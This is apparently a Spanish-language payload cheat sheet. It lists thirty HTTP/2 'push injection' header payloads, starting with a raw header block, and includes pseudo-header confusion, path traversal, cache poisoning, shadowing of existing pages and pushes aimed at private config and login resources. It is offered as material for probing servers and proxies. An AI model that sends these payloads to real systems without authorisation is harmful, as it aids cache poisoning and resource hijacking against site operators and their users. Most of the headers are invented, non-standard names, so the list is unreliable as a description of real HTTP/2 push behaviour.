x-push: /test/basic
x-push-path: /test/path
x-push-create: /test/create.js
x-preload-push: /test/preload.css
:authority: injected.example
x-h2-pseudo: /test/pseudo
:path: /?x-push=/test/promise.js
x-scheme-push: /test/scheme
x-push-cache: /test/cache
x-push-private: /test/private.json
x-push-shadow: /test/shadow.html
x-push-stream: 9
x-push-target: /test/stream
x-cross-conn-push: /test/cross
x-reverse-push: /test/reverse
x-hidden-stream: /test/hidden.js
x-dup-push: /dup/test1.js
x-dup-push: /dup/test2.js
x-multi-push: /multi/1.js,/multi/2.js
x-103-push: </early/push.js>
link: </preload/fake.js>; rel=preload
x-push-priority: 0
x-cdn-push: /cdn/test.js
x-fragment-push: part1|part2|part3
x-tunnel-push: /tunnel/test.js
x-quic-push: /h3/test.js
x-path-push: /../weird/test.js
x-query-push: /test.js?check=1
x-invalid-push: /invalid/test.js
x-weird-push: /ñ/test.js
x-exp-push: /exp/test
x-bin-push: 01010101/test.js
x-login-push: /auth/test.js

```---

# 🔴 **1. Push Injection Básico (forzar un PUSH_PROMISE)**

```
x-push: /injected/push-basic
```

---

# 🔴 **2. Push Path Override**

```
x-push-path: /override/payload
```

---

# 🔴 **3. Forced PUSH Resource Creation**

```
x-push-create: /force/create/resource.js
```

---

# 🔴 **4. Fake Preload Push**

```
x-preload-push: /assets/fake-preload.css
```

---

# 🟠 **5. Push Injection vía Pseudo-Header Confusion**

```
:authority: injected.example
x-h2-pseudo: /pseudo/hacked
```

---

# 🟠 **6. Push Injection vía :path malicioso**

```
:path: /?x-push=/test/promise.js
```

---

# 🟠 **7. Mixed pseudoheaders Push Trigger**

```
:scheme: https
x-scheme-push: /scheme/pushed
```

---

# 🟡 **8. Push Injection con Cache Poisoning**

```
x-push-cache: /cache/poison.js
```

---

# 🟡 **9. Push Injection forzado en recursos privados**

```
x-push-private: /internal/config.json
```

---

# 🟡 **10. Push Poisoning sobre recursos ya existentes**

```
x-push-shadow: /index.html
```

**Objetivo:** reemplazar temporalmente un recurso legítimo.

---

# 🟢 **11. Cross-Stream Push Hijacking**

```
x-push-stream: 9
x-push-target: /stream/hijack
```

---

# 🟢 **12. Cross-Connection Push (si el proxy mezcla conexiones)**

```
x-cross-conn-push: /cross-conn/test.js
```

---

# 🟢 **13. Reverse Push Injection (cliente intenta “empujar” al server)**

```
x-reverse-push: /reverse/test
```

---

# 🔵 **14. Hidden Stream Push Injection**

```
x-hidden-stream: /hidden/push.js
```

---

# 🔵 **15. Push Injection con Headers duplicados**

```
x-dup-push: /dup/test.js
x-dup-push: /dup2/test.js
```

---

# 🔵 **16. Multi-Push Trigger (intento de múltiples PUSH_PROMISE)**

```
x-multi-push: /multi/1.js,/multi/2.js,/multi/3.js
```

---

# 🟣 **17. Early Hints → Push Injection combinado**

```
x-103-push: <link rel="preload" href="/early/push.js">
```

---

# 🟣 **18. Preload Confusion Push (variación moderna)**

```
link: </preload/fake.js>; rel=preload
```

---

# 🟤 **19. Push Priority Abuse**

```
x-push-priority: 0
x-push-target: /priority/test.js
```

---

# 🟤 **20. CDNs con Push Confusion (educativo)**

```
x-cdn-push: /cdn/injected.js
```

---

# ⚫ **21. Split Push Trigger (fragment push)**

```
x-fragment-push: part1|part2|part3
```

---

# ⚫ **22. Push Injection mediante “Request Tunneling”**

```
x-tunnel-push: /tunnel/test.js
```

---

# ⚫ **23. HTTP/3 QUIC Push (idéntico contenido, diferente frame)**

```
x-quic-push: /h3/injected.js
```

---

# ⚡ **24. Push Injection con rutas engañosas (Path Confusion)**

```
x-path-push: /../weird/push.js
```

---

# ⚡ **25. Push Injection con Query Exploding**

```
x-query-push: /test.js?fake=1&push=1
```

---

# ⚡ **26. Push Injection usando encabezados inválidos**

```
x-invalid-push: /invalid/header.js
```

---

# 🧪 **27. Push Injection usando caracteres raros**

```
x-weird-push: /iñjéct/push.js
```

---

# 🧪 **28. Push Injection mediante header “unknown/experimental”**

```
x-exp-push: /experimental/push
```

---

# 🧪 **29. Push Injection con valores binarios (solo texto seguro)**

```
x-bin-push: 01001000/push.js
```

---

# 🧪 **30. Push Injection abuse en recursos de login**

```
x-login-push: /auth.js
``` 
